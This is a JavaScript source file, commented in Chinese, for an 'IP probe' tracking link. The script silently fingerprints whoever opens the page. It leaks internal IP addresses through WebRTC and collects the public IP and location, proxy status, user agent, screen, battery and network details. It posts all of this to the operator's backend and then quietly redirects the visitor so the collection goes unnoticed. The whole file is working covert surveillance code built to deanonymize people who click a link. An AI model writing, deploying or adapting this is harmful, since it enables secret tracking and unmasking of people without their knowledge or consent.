/**
 * IP 探针系统 — 前端静默采集脚本
 * 
 * 采集用户网络/设备/电池/网络类型等信息，通过 WebRTC 获取内网 IP，
 * 所有采集完成后上报到后端并跳转到预设页面。
 * 兼容 ES5 语法，支持 Chrome/Firefox/Safari/Edge/国产浏览器。
 */
(function() {
    'use strict';

    /* ====== 全局变量 ====== */
    var LINK_ID = window.LINK_ID || '';
    var REDIRECT_URL = '';
    var MAX_WAIT = 5000;


    /* ====== 辅助函数 ====== */

    /**
     * UA 解析 — 提取操作系统和浏览器名称（增强版）
     */
    function parseUA(ua) {
        var os = '未知';
        var browser = '未知';

        // === 操作系统 ===
        if (/Windows Phone/.test(ua)) {
            os = 'Windows Phone';
        } else if (/Windows NT 10\.0/.test(ua)) {
            os = /ARM|Touch/.test(ua) ? 'Windows RT' : 'Windows 10';
        } else if (/Windows NT 6\.3/.test(ua)) {
            os = 'Windows 8.1';
        } else if (/Windows NT 6\.2/.test(ua)) {
            os = 'Windows 8';
        } else if (/Windows NT 6\.1/.test(ua)) {
            os = 'Windows 7';
        } else if (/Windows NT/.test(ua)) {
            os = 'Windows';
        } else if (/Android[\s/](\d+[\.\d]*)/.test(ua)) {
            os = 'Android ' + RegExp.$1;
        } else if (/iPhone OS (\d+[_\d]*)/.test(ua)) {
            os = 'iOS ' + RegExp.$1.replace(/_/g, '.');
        } else if (/iPad.*OS (\d+[_\d]*)/.test(ua)) {
            os = 'iPadOS ' + RegExp.$1.replace(/_/g, '.');
        } else if (/Mac OS X (\d+[._]\d+[._\d]*)/.test(ua)) {
            os = 'macOS ' + RegExp.$1.replace(/_/g, '.');
        } else if (/CrOS/.test(ua)) {
            os = 'Chrome OS';
        } else if (/Linux/.test(ua)) {
            os = 'Linux';
        } else if (/HarmonyOS/.test(ua)) {
            os = 'HarmonyOS';
        }

        // === 浏览器（顺序很重要，先匹配特有标识） ===
        if (/Edg(?:e|iOS|A)?\/(\d+)/.test(ua)) {
            browser = 'Edge ' + RegExp.$1;
        } else if (/OPR\/(\d+)/.test(ua) || /Opera/.test(ua)) {
            browser = 'Opera ' + (RegExp.$1 || '');
        } else if (/UCBrowser\/(\d+)/.test(ua)) {
            browser = 'UC ' + RegExp.$1;
        } else if (/QQBrowser\/(\d+)/.test(ua)) {
            browser = 'QQ浏览器 ' + RegExp.$1;
        } else if (/MiuiBrowser\/(\d+)/.test(ua)) {
            browser = '小米浏览器 ' + RegExp.$1;
        } else if (/HuaweiBrowser\/(\d+)/.test(ua)) {
            browser = '华为浏览器 ' + RegExp.$1;
        } else if (/BIDUBrowser\/(\d+)/.test(ua)) {
            browser = '百度 ' + RegExp.$1;
        } else if (/SogouMobileBrowser/.test(ua)) {
            browser = '搜狗浏览器';
        } else if (/Vivaldi\/(\d+)/.test(ua)) {
            browser = 'Vivaldi ' + RegExp.$1;
        } else if (/Brave/.test(ua)) {
            browser = 'Brave';
        } else if (/SamsungBrowser\/(\d+)/.test(ua)) {
            browser = '三星浏览器 ' + RegExp.$1;
        } else if (/CriOS\/(\d+)/.test(ua)) {
            browser = 'Chrome(iOS) ' + RegExp.$1;
        } else if (/FxiOS\/(\d+)/.test(ua)) {
            browser = 'Firefox(iOS) ' + RegExp.$1;
        } else if (/Chrome\/(\d+)/.test(ua)) {
            browser = 'Chrome ' + RegExp.$1;
        } else if (/Firefox\/(\d+)/.test(ua)) {
            browser = 'Firefox ' + RegExp.$1;
        } else if (/Version\/(\d+).*Safari/.test(ua)) {
            browser = 'Safari ' + RegExp.$1;
        } else if (/MSIE (\d+)/.test(ua) || /Trident.*rv:(\d+)/.test(ua)) {
            browser = 'IE ' + (RegExp.$1 || '');
        }

        return { os: os, browser: browser };
    }


    /* ====== 采集函数 ====== */

    /**
     * 获取公网 IP 信息（通过后端 API 代理请求）
     */
    function fetchIpInfo() {
        return fetch((window.SITE_URL || '') + '/api.php?action=get_ip')
            .then(function(resp) { return resp.json(); })
            .catch(function(err) {
                return { ipv4: '', ipv6: '', location: {}, is_proxy: false, proxy_detected_by: null };
            });
    }

    /**
     * 通过 WebRTC 获取内网 IP
     */
    function getWebRTCIPs() {
        return new Promise(function(resolve) {
            var ips = [];
            var resolved = false;

            if (!window.RTCPeerConnection && !window.webkitRTCPeerConnection && !window.mozRTCPeerConnection) {
                resolve([]);
                return;
            }

            var RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
            var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });

            try {
                pc.createDataChannel('');
            } catch (e) {}

            pc.onicecandidate = function(event) {
                if (!event.candidate || !event.candidate.candidate) {
                    return;
                }
                var candidate = event.candidate.candidate;
                var ipRegex = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})|([a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})/i;
                var match = candidate.match(ipRegex);

                if (match && ips.indexOf(match[0]) === -1) {
                    ips.push(match[0]);
                }
            };

            pc.createOffer()
                .then(function(offer) {
                    return pc.setLocalDescription(offer);
                })
                .catch(function() {});

            setTimeout(function() {
                if (!resolved) {
                    resolved = true;
                    try { pc.close(); } catch (e) {}
                    resolve(ips);
                }
            }, 3000);
        });
    }

    /**
     * 采集设备信息
     */
    function getDeviceInfo() {
        return new Promise(function(resolve) {
            var uaInfo = parseUA(navigator.userAgent);
            
            resolve({
                user_agent_raw: navigator.userAgent,
                os: uaInfo.os,
                browser: uaInfo.browser,
                language: navigator.language || navigator.userLanguage || '',
                screen: screen.width + 'x' + screen.height,
                dpr: window.devicePixelRatio || 1
            });
        });
    }

    /**
     * 采集电池信息
     */
    function getBatteryInfo() {
        return new Promise(function(resolve) {
            if (!navigator.getBattery) {
                resolve({ battery_level: null, battery_charging: null });
                return;
            }

            navigator.getBattery()
                .then(function(battery) {
                    resolve({
                        battery_level: battery.level !== undefined ? Math.round(battery.level * 100) : null,
                        battery_charging: battery.charging !== undefined ? battery.charging : null
                    });
                })
                .catch(function() {
                    resolve({ battery_level: null, battery_charging: null });
                });
        });
    }

    /**
     * 采集网络信息
     */
    function getNetworkInfo() {
        return new Promise(function(resolve) {
            var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

            if (!connection) {
                resolve({ network_type: null, connection_downlink: null });
                return;
            }

            resolve({
                network_type: connection.effectiveType || null,
                connection_downlink: connection.downlink !== undefined ? connection.downlink : null
            });
        });
    }

    /**
     * 获取跳转目标 URL
     */
    function getRedirectUrl() {
        return fetch((window.SITE_URL || '') + '/api.php?action=collect_info&id=' + encodeURIComponent(LINK_ID))
            .then(function(resp) { return resp.json(); })
            .then(function(data) {
                if (data.redirect_url) {
                    REDIRECT_URL = data.redirect_url;
                }
                return data;
            })
            .catch(function() {
                return {};
            });
    }

    /**
     * 上报采集数据到后端
     */
    function reportData(data) {
        return fetch((window.SITE_URL || '') + '/api.php?action=save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).then(function(resp) { return resp.json(); })
          .catch(function() {});
    }

    /**
     * 从采集结果中拼装完整上报数据
     */
    function buildData(results) {
        // results 顺序：[ipInfo, webrtcIPs, deviceInfo, batteryInfo, networkInfo, redirectUrl]
        var ipInfo = (results[0] && results[0].value) ? results[0].value : {};
        var webrtcIPs = (results[1] && results[1].value) ? results[1].value : [];
        var deviceInfo = (results[2] && results[2].value) ? results[2].value : {};
        var batteryInfo = (results[3] && results[3].value) ? results[3].value : {};
        var networkInfo = (results[4] && results[4].value) ? results[4].value : {};

        return {
            link_id: LINK_ID,
            ipv4: ipInfo.ipv4 || '',
            ipv6: ipInfo.ipv6 || '',
            webrtc_ips: webrtcIPs,
            location: ipInfo.location || {},
            user_agent_raw: deviceInfo.user_agent_raw || '',
            os: deviceInfo.os || '',
            browser: deviceInfo.browser || '',
            language: deviceInfo.language || '',
            screen: deviceInfo.screen || '',
            dpr: deviceInfo.dpr || 1,
            battery_level: batteryInfo.battery_level,
            battery_charging: batteryInfo.battery_charging,
            network_type: networkInfo.network_type,
            connection_downlink: networkInfo.connection_downlink,
            is_proxy: ipInfo.is_proxy || false,
            proxy_detected_by: ipInfo.proxy_detected_by || null
        };
    }

    /**
     * 执行跳转
     */
    function doRedirect() {
        if (REDIRECT_URL) {
            window.location.replace(REDIRECT_URL);
        }
    }


    /* ====== 主流程 ====== */

    Promise.allSettled([
        fetchIpInfo(),
        getWebRTCIPs(),
        getDeviceInfo(),
        getBatteryInfo(),
        getNetworkInfo(),
        getRedirectUrl()
    ]).then(function(results) {
        var data = buildData(results);
        return reportData(data);
    }).then(function() {
        doRedirect();
    }).catch(function() {
        doRedirect();
    });

    // 5 秒超时兜底：无论如何都要跳转
    setTimeout(function() {
        doRedirect();
    }, MAX_WAIT);

})();
